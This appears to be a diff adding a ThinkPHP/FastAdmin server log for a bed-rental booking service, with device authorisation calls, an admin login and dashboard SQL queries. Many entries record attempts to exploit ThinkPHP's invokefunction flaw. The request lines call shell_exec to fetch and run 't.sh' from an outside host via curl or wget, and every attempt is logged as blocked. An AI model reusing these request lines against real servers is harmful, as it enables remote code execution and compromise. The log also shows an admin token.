@@ -1,0 +1,483 @@
+---------------------------------------------------------------
+[ 2020-03-16T00:12:18+08:00 ] 117.132.195.59 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C47672A346EB"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T00:29:10+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T00:29:11+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T01:28:26+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T01:28:27+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T02:21:22+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T02:21:23+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T03:30:34+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T03:30:35+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T04:32:09+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T04:32:10+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T05:27:15+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T05:27:16+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T06:29:46+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T06:29:46+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T07:22:50+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T07:22:51+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T08:23:26+08:00 ] 39.144.18.214 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"DAC2EA93FCAB"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T08:24:57+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T08:24:58+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T09:15:34+08:00 ] 221.178.125.35 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"CDDB56424E99"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T09:28:26+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T09:28:27+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T09:54:11+08:00 ] 117.132.194.151 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D816B1C7F1EC"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T09:54:11+08:00 ] 223.104.254.9 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"EFF89F9A7A4C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T09:55:04+08:00 ] 117.132.198.71 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D7585C421442"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T09:55:24+08:00 ] 117.132.197.2 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D816B1C7F1EC"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:07:27+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T10:07:29+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T10:09:39+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:09:49+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:09:55+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:10:01+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:10:06+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:10:13+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:10:18+08:00 ] 117.132.192.49 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C8F0C64C482C"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T10:46:10+08:00 ] 36.17.122.128 POST /admin/index/login?url=%2Fadmin%2Findex%2Findex
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000602s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_admin` [ RunTime:0.000662s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_admin` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000343s ]
+[ sql ] [ SQL ] UPDATE `fa_admin`  SET `logintime`=1584326770,`token`='06516e0f-b89e-47d1-8628-3b5bbcbab391',`updatetime`=1584326770  WHERE  `id` = 2 [ RunTime:0.000338s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_admin_log` [ RunTime:0.000484s ]
+[ sql ] [ SQL ] INSERT INTO `fa_admin_log` (`title` , `content` , `url` , `admin_id` , `username` , `useragent` , `ip` , `createtime`) VALUES ('登录' , '{\"url\":\"\\/admin\\/index\\/index\",\"__token__\":\"e65419f17a41f53cd9cc1f78c6c9da3c\",\"username\":\"admin\"}' , '/admin/index/login?url=%2Fadmin%2Findex%2Findex' , 2 , 'admin' , 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1' , '36.17.122.128' , 1584326770) [ RunTime:0.000264s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:10+08:00 ] 36.17.122.128 GET /admin/index/index
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000645s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000627s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000368s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000555s ]
+[ sql ] [ SQL ] SELECT `id`,`pid`,`condition`,`icon`,`name`,`title`,`ismenu` FROM `fa_auth_rule` WHERE  `status` = 'normal'  AND `id` IN (1,2,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,40,41,42,43,44,45,46,47,48,49,50,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,184,189,190,191,192,193,194,197,198,199,200,201,202,203,204,205,206,207,208,209,211,5,131,182,181,188) [ RunTime:0.001217s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard?addtabs=1
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000624s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000593s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000406s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000302s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000305s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000275s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_users` [ RunTime:0.000486s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_users` WHERE  ( `createtime` >= 1582560000 AND `createtime` < 1584374400 ) [ RunTime:0.001083s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000581s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_bedorder` WHERE  `status` >= -1  AND ( `createtime` >= 1582560000 AND `createtime` < 1584374400 ) [ RunTime:0.002342s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000494s ]
+[ sql ] [ SQL ] SELECT `title`,`remark` FROM `fa_auth_rule` WHERE  `name` = 'dashboard' LIMIT 1 [ RunTime:0.000225s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard/usercount
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008011s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000793s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000431s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000647s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000366s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000320s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000286s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_users` [ RunTime:0.000484s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_users` LIMIT 1 [ RunTime:0.000414s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard/todayregister
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000578s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000490s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000290s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000471s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000287s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000300s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000271s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_users` [ RunTime:0.000521s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_users` WHERE  ( `createtime` >= 1584288000 AND `createtime` < 1584374400 ) LIMIT 1 [ RunTime:0.000446s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard/orderinfo
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000545s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000487s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000277s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000475s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000279s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000299s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000279s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000501s ]
+[ sql ] [ SQL ] SELECT (total-refund) as amount FROM `fa_bedorder` WHERE  `admin_id` IN (7,10,11,15,16,17,2)  AND `status` >= -1 [ RunTime:0.001587s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard/devcount
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000539s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000441s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000273s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000475s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000275s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000284s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000264s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_device` [ RunTime:0.000506s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_device` WHERE  `admin_id` IN (7,10,11,15,16,17,2) LIMIT 1 [ RunTime:0.000347s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard/unsettleorder
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000697s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000821s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000443s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000601s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000387s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000365s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000346s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000713s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_bedorder` WHERE  `status` >= -1  AND `step` < 9000 LIMIT 1 [ RunTime:0.001531s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:11+08:00 ] 36.17.122.128 GET /admin/dashboard/todayorder
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000527s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000472s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000294s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000459s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000308s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000308s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000287s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_bedorder` WHERE  `status` >= -1  AND ( `createtime` >= 1584288000 AND `createtime` < 1584374400 ) LIMIT 1 [ RunTime:0.000964s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:12+08:00 ] 36.17.122.128 GET /admin/dashboard/todaylogin
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000582s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000532s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000304s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000467s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000312s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000293s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000331s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_oauth` [ RunTime:0.000418s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_oauth` WHERE  ( `createtime` >= 1584288000 AND `createtime` < 1584374400 ) LIMIT 1 [ RunTime:0.001803s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:12+08:00 ] 36.17.122.128 GET /admin/dashboard/sevendnudau
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000636s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000598s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000349s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000517s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000305s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000313s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000278s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_users` [ RunTime:0.000495s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_users` WHERE  ( `createtime` >= 1583683200 AND `createtime` < 1584374400 ) LIMIT 1 [ RunTime:0.000467s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_oauth` [ RunTime:0.000413s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM ( SELECT count(*) FROM `fa_oauth` WHERE  ( `createtime` >= 1583683200 AND `createtime` < 1584374400 ) GROUP BY `id` ) `_group_count_` LIMIT 1 [ RunTime:0.002239s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_users` LIMIT 1 [ RunTime:0.000392s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:23+08:00 ] 36.17.122.128 GET /admin/order/bedorder?addtabs=1
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000650s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000639s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000372s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT `id`,`pid`,`condition`,`icon`,`name`,`title`,`ismenu` FROM `fa_auth_rule` WHERE  `status` = 'normal'  AND `id` IN (1,2,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,40,41,42,43,44,45,46,47,48,49,50,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,184,189,190,191,192,193,194,197,198,199,200,201,202,203,204,205,206,207,208,209,211,5,131,182,181,188) [ RunTime:0.001183s ]
+[ sql ] [ SQL ] SELECT `title`,`remark` FROM `fa_auth_rule` WHERE  `name` = 'order/bedorder' LIMIT 1 [ RunTime:0.000363s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:46:23+08:00 ] 36.17.122.128 GET /admin/order/bedorder/index?sort=order_no&order=desc&offset=0&limit=10&filter=%7B%7D&op=%7B%7D&_=1584326783800
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000638s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000635s ]
